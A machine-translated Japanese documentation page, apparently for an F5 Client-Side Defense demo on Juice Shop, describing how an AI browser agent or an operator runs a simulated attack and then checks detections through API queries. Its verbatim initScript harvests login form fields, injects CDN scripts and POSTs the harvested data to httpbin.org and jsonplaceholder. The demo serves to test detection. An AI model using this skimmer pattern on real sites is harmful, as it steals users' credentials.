@@ -1,0 +1,257 @@
+---
+title: Phase 2 — 攻撃
+description: 事前構築されたスクリプトを使用してクライアント側の攻撃トラフィックをシミュレートし、CSD検出をトリガーします
+sidebar:
+  order: 3
+  label: Phase 2 — 攻撃
+i18n:
+  sourceHash: 7f35d419bf2b
+  translator: machine
+---
+
+import { Aside, Steps } from "@astrojs/starlight/components";
+
+Phase 2は保護されたアプリケーションに対してシミュレートされた攻撃トラフィックを生成し、CSDがそれを検出したことを確認します。Phase 1が完了している必要があります。すべてのStep 7チェックがPASSしてから進めてください。
+
+## Step 8: 攻撃シミュレーション
+
+<Aside type="note">
+このステップはブラウザ側のJavaScript実行が必要です。`curl`はCSD検出をトリガーできません。ブラウザ自動化ツール（MCP Chrome DevTools、Playwright、Puppeteer）を搭載したAIアシスタントは、以下の**AI自動実行シーケンス**を使用してこれらのステップを直接実行します。ブラウザ自動化を持たないオペレータは手動ステップを実行します。
+</Aside>
+
+インフラストラクチャが検証された後（Phase 1のStep 7チェックすべてがPASS）、攻撃シミュレーションスクリプトを実行してCSD検出を生成します。スクリプトは[トリガー検出](/csd/trigger-detection/)ガイドと[攻撃スクリプトライブラリ](/csd/attack-scripts/)で定義されています。
+
+### AI自動実行
+
+ブラウザ自動化ツールを搭載したAIアシスタントは、攻撃シミュレーションをプログラムで実行します：
+
+1. **initScriptでナビゲート** — まず`about:blank`にナビゲートしてクリーンなドキュメントコンテキストを確保し（前のナビゲーションからの古いinitScriptを避ける）、その後`navigate_page`で`http://$F5XC_DOMAINNAME/#/login`にナビゲートします。initScriptはzone.jsがそれらにパッチを当てる前に、ネイティブな`setInterval`、`clearInterval`、`fetch`、`console.log`を保存し、ログインフォームフィールドをポーリングし、ネイティブな`HTMLInputElement.prototype.value`セッターを使用して認証情報を入力し、結合検出スクリプトをインラインで即座に実行します。以下のverbatim initScriptを使用してください。
+2. **ウェルカムバナーを閉じる** — `Escape`キーで`press_key`してウェルカムバナーを閉じます。後続のアクセスではバナーが表示されない場合があります（クッキーが保持される）。クッキー同意ダイアログはEscapeキーで自動的に閉じられます。
+3. **完了を待つ** — すべてのCDNスクリプトロード/エラーコールバックとfetchプロミス解決が完了するまで10秒間待機します。
+4. **証拠を取得** — `list_console_messages`で`[CSD Demo] Simulation complete`とCDNロード結果をチェック。`list_network_requests`を`script`および`fetch`タイプでフィルタリングして、HTTPステータスコード（成功の場合は`200`/`201`、保留中の場合は`pending`）を確認します。
+
+**Phase 2 initScript（verbatim — 正確にこのように書く）：**
+
+```javascript
+// Save native references before zone.js patches them
+var _si = window.setInterval.bind(window);
+var _ci = window.clearInterval.bind(window);
+var _fetch = window.fetch.bind(window);
+var _log = window.console.log.bind(window.console);
+
+// Poll for login form fields, fill credentials, run detection script
+var _poll = _si(function() {
+  var emailEl = document.querySelector('#email');
+  var passEl  = document.querySelector('#password');
+  if (emailEl && passEl) {
+    _ci(_poll);
+    // Fill credentials via native setter (bypasses zone.js)
+    var nativeSet = Object.getOwnPropertyDescriptor(
+      window.HTMLInputElement.prototype, 'value').set;
+    nativeSet.call(emailEl, 'test@example.com');
+    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+    nativeSet.call(passEl, 'P@ssword123');
+    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+
+    // Run Combined Detection Script inline using native fetch for exfil
+    (function() {
+      _log('==================================================');
+      _log('[CSD Demo] Combined Detection Script — Starting');
+      _log('==================================================');
+
+      _log('\n[Formjack] Phase 1: Form field harvesting');
+      var inputs = document.querySelectorAll('input');
+      var harvested = {};
+      inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+      });
+      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
+      var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+      ];
+      cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
+        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
+        document.head.appendChild(script);
+        _log('[Supply Chain] Injected script tag: ' + cdn.name);
+      });
+
+      _log('\n[Exfil] Phase 3: Data exfiltration');
+      var payload = JSON.stringify({
+        type: 'combined_demo', credentials: harvested,
+        page: window.location.href, timestamp: Date.now()
+      });
+      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+      _fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' }, body: payload
+      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+
+      _log('\n==================================================');
+      _log('[CSD Demo] Simulation complete');
+      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
+      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+      _log('==================================================');
+    })();
+  }
+}, 300);
+```
+
+<Aside type="caution">
+**zone.js非互換性** — Juice ShopはAngularのzone.jsを使用しており、`setTimeout`、`setInterval`、`fetch`、`XMLHttpRequest`その他のブラウザAPIにパッチを当てます。これにより、MCP `evaluate_script`、`fill`、`click`ツールが`Cannot read properties of undefined (reading 'call')`で破綻します。代わりに`navigate_page`と`initScript`を使用してください。`initScript`はzone.jsロードの前に実行されるため、ネイティブAPI参照を保存してポーリングコールバックで使用できます。initScriptはネイティブな`HTMLInputElement.prototype.value`セッター（`fill`ではなく）を使用してフォームフィールドを入力し、検出スクリプトをインライン実行する必要があります（zone.jsがページロード後に傍受する可能性のある`setTimeout`ではなく）。詳細は[トリガー検出 — AI自動実行](/csd/trigger-detection/#ai-automated-execution)を参照してください。
+</Aside>
+
+<Aside type="note">
+**initScript蓄積** — `navigate_page`呼び出しごとに`initScript`パラメータを使用すると、スクリプトが後続のすべてのドキュメントロードで実行される永続的なリストに追加されます。古いスクリプトが干渉するのを避けるため、実行間で`about:blank`にナビゲートするか、`new_page`を`isolatedContext`と共に使用してクリーンなブラウザコンテキストを作成してください。
+</Aside>
+
+<Aside type="note">
+**initScriptでネイティブな`fetch`を保存** — initScriptはzone.jsがそれにパッチを当てる前に`window.fetch.bind(window)`を保存します。これにより、zone.js `Cannot read properties of undefined`エラーなくfetch呼び出しが正常に機能します。同じinitScript（ネイティブな`fetch`を保存した）がPhase 2とPhase 3の攻撃実行の両方で使用されます。CSD緩和は`fetch()`呼び出しをインターセプトしないため、ネイティブ参照を保存しても緩和動作に影響しません。
+</Aside>
+
+<Aside type="caution">
+**一時的なオリジン404** — Angularアプリケーションへの最初のナビゲーション時に、`polyfills.js`またはその他のアプリスクリプトがオリジンサーバーから一時的なHTTP 404を返すことがあります。これによりAngularのブートストラップが失敗し、ログインフォームがないブランクページが表示されます。404は一時的なものです。後続のリクエストは200または304を返します。**復旧方法：** `about:blank`にナビゲートし、2秒待機してからナビゲーションを再試行してください。複数の再試行でも問題が解決しない場合は、ロードバランサーパスを通じてオリジンの健全性を確認してください（`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`）。
+</Aside>
+
+### 手動実行
+
+ブラウザ自動化ツールを持たないオペレータは、手動でステップを実行します：
+
+1. **ナビゲート** — 保護されたアプリケーションのログインページ`http://xF5XC_DOMAINNAMEx/#/login`にナビゲートします。
+2. **ダミー認証情報を入力** — メールフィールドに`test@example.com`、パスワードフィールドに`P@ssword123`を入力します（フォームは送信しない）。
+3. **DevToolsを開く** — **F12**キーを押して、**コンソール**タブに切り替えます。
+4. **結合検出スクリプトを実行** — [トリガー検出 — 結合シミュレーションスクリプトを実行](/csd/trigger-detection/#run-the-combined-simulation-script)のスクリプトをコンソールに貼り付けて、Enterキーを押します。
+5. **コンソール出力を検証** — `[CSD Demo]`段階的出力に以下が含まれていることを確認します：フィールドハーベスト、4つのCDNドメインからのスクリプト注入、2つのエンドポイントへのデータ流出
+
+### トリガーされるもの
+
+| シグナル | 動作 | 検出 |
+| --- | --- | --- |
+| フォームフィールドハーベスティング | メールとパスワード入力値を読み取る | 機密フォームフィールドを読み取るスクリプト — 高リスクとしてフラグ |
+| スクリプト注入 | `cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`から4つの`<script>`タグを注入 | 検出された最大4つの新しいサードパーティスクリプトドメイン（CDN利用可能性は異なります） |
+| データ流出 | `fetch`を使用してハーベストされたデータを`www.httpbin.org`と`jsonplaceholder.typicode.com`に送信 | 外部ドメインへのネットワークコール |
+
+<Aside type="note">
+**CDN利用可能性は異なります。** 4つのCDNスクリプトすべてがすべての実行でロードされるわけではありません。ブラウザリソースの制限、ネットワーク状態、またはCDNスロットリングにより、一部が`ERR_INSUFFICIENT_RESOURCES`またはタイムアウトで失敗する可能性があります。シミュレーションは、**いずれかの**CDNスクリプトがロードされれば成功します。CSDは、スクリプトが正常にロードされるかどうかに関わらず、注入試行を検出します。`<script>`タグの作成自体が検出シグナルです。
+
+重大な場合、`ERR_INSUFFICIENT_RESOURCES`はページレベルの障害にエスカレートできます。ページ全体がブランクになり、スクリーンショットがタイムアウトし、`take_snapshot`が失敗します。これは通常、複数のナビゲーションの後、同じブラウザコンテキストで重い初期スクリプトが蓄積された場合に発生します。**復旧方法：** `new_page`を`isolatedContext`と共に使用して新しいブラウザコンテキストを作成し、`about:blank` → `navigate_page`と初期スクリプトシーケンスから再試行してください。これは個々のCDNスクリプト障害とは異なり、個々のCDNスクリプト障害はシミュレーション成功に影響しません。
+</Aside>
+
+<Aside type="tip">
+攻撃シミュレーション実行後、この決定論的ポーリングループを使用して検出を待機します：
+
+1. 60秒ごとに`/detected_domains`をクエリします
+2. DET-3がパスした場合（流出ドメインが`/detected_domains`に表示される）、すぐにStep 9に進みます
+3. 10クエリ後（10分）も空の場合、CSDステータス（Phase 1 Step 5）と保護されたドメイン登録（Phase 1 Step 6）を確認します。これらのいずれかが誤って構成されている可能性があります
+4. 30クエリ後（30分）も空の場合、停止してオペレータに報告します。Phase 3に進まないでください。
+
+個別の攻撃カテゴリ（最大検出ストレステスト）を対象とした追加のターゲット型シミュレーションについては、[攻撃スクリプトライブラリ](/csd/attack-scripts/)を参照してください。
+</Aside>
+
+### 証拠
+
+AIアシスタントは以下を報告する必要があります。AI自動実行の場合、証拠は`list_console_messages`を通じてプログラムで取得されます（initScriptのポーリング関数はコンソールに結果をログします）。手動実行の場合、オペレータはブラウザコンソール出力を読みます。
+
+| チェック | 期待値 | ステータス |
+| --- | --- | --- |
+| ログインページロード | `http://$F5XC_DOMAINNAME/#/login`で`200 OK` | PASS / FAIL |
+| コンソールスクリプト実行 | コンソール出力に`[CSD Demo] Simulation complete` | PASS / FAIL |
+| フィールドハーベスト | コンソール出力でカウント > 0 | PASS |
+| スクリプト注入 | コンソール出力で1～4つのCDNドメイン（一部はリソースエラーで失敗する可能性あり） | いずれかのCDNドメインが表示されればPASS |
+| 流出チャネル | コンソール出力で2つのfetch POST試行 | PASS |
+
+<Aside type="tip">
+HTTPS LB証明書が有効な場合（`CertificateValid`）、オプションで`https://$F5XC_DOMAINNAME/#/login`に対してもシミュレーションを実行できます。これはデモ進行に必須ではありません。
+</Aside>
+
+## Step 9: API経由の検出検証
+
+CSD APIエンドポイントをクエリして、検出が表示されたことを確認します。ポーリングループを使用します。60秒ごとに`/detected_domains`をクエリし、DET-3がパスするとすぐに進みます。DET-3が10分後にパスしない場合、CSD設定を確認します。DET-3が30分後にパスしない場合、停止してオペレータに報告します。これらのエンドポイントは[APIリファレンス](/csd/api-reference/)で記載されており、以前のステップと同じ認証とネームスペースを使用します。
+
+<Aside type="note">
+**エンドポイント処理順序：** `/detected_domains`が最初に入力され、CSDパイプラインが機能していることの主要な指標です。`/scripts`と`/formFields`は遅いバックエンド処理スケジュールで入力され、複数のシミュレーション実行後でも20～30分間空のままである可能性があります。`/detected_domains`が流出ドメイン（`www.httpbin.org`、`jsonplaceholder.typicode.com`）を表示する場合、シミュレーションが正常に検出されたとみなし、進みます。以下のDET-1チェックはこれを反映しています。
+</Aside>
+
+### 検出されたスクリプト
+
+過去24時間で検出されたスクリプトをクエリします：
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s -X POST \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  -H "Content-Type: application/json" \
+  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
+  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
+```
+
+| フィールド | 期待値 | ステータス |
+| --- | --- | --- |
+| `total` | > 0（スクリプト検出） | > 0の場合PASS。`/detected_domains`が流出ドメインを表示する場合PENDING（0の場合） |
+| スクリプト名 | `script_name`にCDNドメイン（`cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`）が含まれる | 注入されたCDNドメインが表示される場合PASS |
+
+### 検出されたドメイン
+
+```bash
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
+  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
+```
+
+| フィールド | 期待値 | ステータス |
+| --- | --- | --- |
+| `total_domains` | > 0 | > 0の場合PASS |
+| ドメインリスト | CDNおよび流出ドメインが含まれる | 期待されるドメインが表示される場合PASS |
+
+### フォームフィールド
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
+  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
+```
+
+| フィールド | 期待値 | ステータス |
+| --- | --- | --- |
+| `total` | > 0 | > 0の場合PASS。DET-3がパスするが0の場合PENDING |
+| `name` | `email`、`password`が含まれる | 機密フィールドが表示される場合PASS |
+| `sensitivity` | メール/パスワードフィールドの場合`Sensitive` | MLが正しく分類される場合PASS |
+
+<Aside type="note">
+**フォームフィールド処理はドメイン検出より遅い。** `/formFields`エンドポイントは最初のクエリで部分的なメタデータを持つフィールドを返す可能性があります。ML感度分類（`Sensitive`対`Not Sensitive`）はバックエンド処理の完了後に入力されます。これは最初のシミュレーション実行から20～30分かかることができます。フィールドは表示されるが分類が不足している場合、後で再クエリしてください。DET-3（`/detected_domains`）は主要なパス条件です。
+</Aside>
+
+### Phase 2証拠サマリー
+
+すべての検出クエリの後、最終検出ステータスを提示します：
+
+| テストID | チェック | ステータス |
+| --- | --- | --- |
+| DET-1 | スクリプト検出（`/scripts`エンドポイント） | > 0の場合PASS。DET-3がパスするが空の場合PENDING |
+| DET-2 | CDNドメイン検出 | PASS / FAIL |
+| DET-3 | 流出ドメイン検出（`/detected_domains`） | **主要指標** — `www.httpbin.org`または`jsonplaceholder.typicode.com`が表示される場合PASS |
+| DET-4 | フォームフィールド検出（`/formFields`エンドポイント） | > 0の場合PASS。DET-3がパスするが空の場合PENDING |
+
+<Aside type="note">
+**Phase 3に進むための最小パス条件：** DET-3はPASSする必要があります（流出ドメインが`/detected_domains`に表示される）。DET-1およびDET-4は初回使用後または新規再構築後にPENDINGを表示する場合があります。これは正常です。DET-3も30分後にFAILを表示する場合は、CSDが有効であることを確認します（Phase 1 Step 5）。保護されたドメインが登録されていることを確認します（Phase 1 Step 6）。CSD JSタグが注入されていることを確認します（Phase 1 Step 7 JS設定チェック）。
+</Aside>
+
+---
+
+**Phase 2完了。** [Phase 3 — 緩和](/csd/demo/phase-3-mitigate/)に進んで、緩和ルールを適用し、ドメインがブロックされていることを検証してください。
